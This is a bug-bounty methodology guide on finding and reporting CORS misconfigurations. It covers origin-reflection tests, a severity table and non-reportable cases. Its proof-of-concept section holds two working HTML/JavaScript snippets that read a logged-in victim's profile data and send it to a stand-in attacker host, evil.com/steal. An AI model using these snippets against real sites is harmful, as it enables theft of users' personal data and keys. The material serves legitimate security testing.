# CORS Misconfiguration — Hunting Methodology

## What Is CORS

Cross-Origin Resource Sharing (CORS) controls which origins can read responses from another origin. A misconfigured CORS policy on an authenticated API allows an attacker's website to make credentialed requests on behalf of a logged-in victim and **read the response** — bypassing the Same-Origin Policy.

> **Key distinction from CSRF:** CSRF sends requests without reading the response. CORS misconfig allows the attacker to **READ sensitive response data**.

---

## Finding CORS Entry Points

Every authenticated API endpoint is a potential CORS target. Priority targets:
- `/api/user/profile` — PII exfiltration
- `/api/account/settings` — email, phone, payment info
- `/api/admin/*` — admin-level data
- `/api/tokens` or `/api/keys` — API keys, session tokens
- Any endpoint returning sensitive JSON

---

## Detection: Test Origin Reflection

**Step 1 — Send an arbitrary Origin header and check if it's reflected:**

```http
GET /api/v1/user/profile HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=<valid_session>
```

**Vulnerable response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

→ **Both headers together = Critical CORS misconfiguration.** Attacker can read response from evil.com with victim's credentials.

**Step 2 — Test `null` origin (sandbox iframes):**
```http
Origin: null
```
If response includes `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` → exploitable via sandboxed iframe.

**Step 3 — Test subdomain confusion:**
```http
Origin: https://evil.target.com
Origin: https://target.com.evil.com
Origin: https://notreallytarget.com
```
Check if the wildcard check is done incorrectly (e.g., `endsWith('target.com')` without anchoring).

---

## CORS Misconfiguration Patterns

| Pattern | Exploitable? |
|---|---|
| `ACAO: *` (wildcard) | ❌ NOT exploitable — credentials not sent with wildcard |
| `ACAO: https://evil.com` + `ACAC: true` | ✅ **Critical** — full credential read |
| `ACAO: null` + `ACAC: true` | ✅ **High** — via sandboxed iframe |
| `ACAO: https://evil.target.com` + `ACAC: true` | ✅ **High** — if attacker controls subdomain |
| `ACAO: *` without `ACAC` | ❌ Only useful for unauthenticated data |
| Origin not reflected, fixed trusted list | ❌ Not exploitable |
| `ACAO: https://trusted.com` (fixed, not reflected) | ❌ Not exploitable unless you control trusted.com |

---

## Exploit Proof of Concept

For a confirmed `ACAO: evil.com` + `ACAC: true`, provide this PoC HTML:

```html
<html>
<body>
<script>
fetch('https://target.com/api/v1/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/steal?d=' + JSON.stringify(data));
});
</script>
</body>
</html>
```

**Victim visits evil.com → their profile data (email, PII, API keys) is sent to attacker.**

For `null` origin exploit:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
fetch('https://target.com/api/v1/user/profile', {credentials: 'include'})
.then(r => r.json())
.then(d => top.postMessage(JSON.stringify(d), '*'))
</script>"></iframe>
<script>
window.addEventListener('message', e => {
  fetch('https://evil.com/steal?d=' + e.data);
});
</script>
```

---

## Subdomain Takeover + CORS Chain

If `ACAO` trusts `*.target.com` and you can take over `external.target.com` (subdomain takeover), these two bugs chain into a Critical finding. Document both bugs and the chain explicitly in the report.

---

## Impact Classification

| Scenario | Severity |
|---|---|
| Origin reflected + `ACAC: true` on auth'd sensitive API | Critical/High |
| `null` origin + `ACAC: true` | High |
| Subdomain domain confusion + `ACAC: true` | High |
| Wildcard `*` on authenticated endpoints (no ACAC) | Low/Informational |
| Wildcard `*` on public, unauthenticated data | Not reportable |

---

## Do Not Report
- `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true` — not exploitable for credential theft
- CORS on endpoints that only return public, non-sensitive data
- CORS configuration considered a "best practice" issue without a concrete exploitable scenario
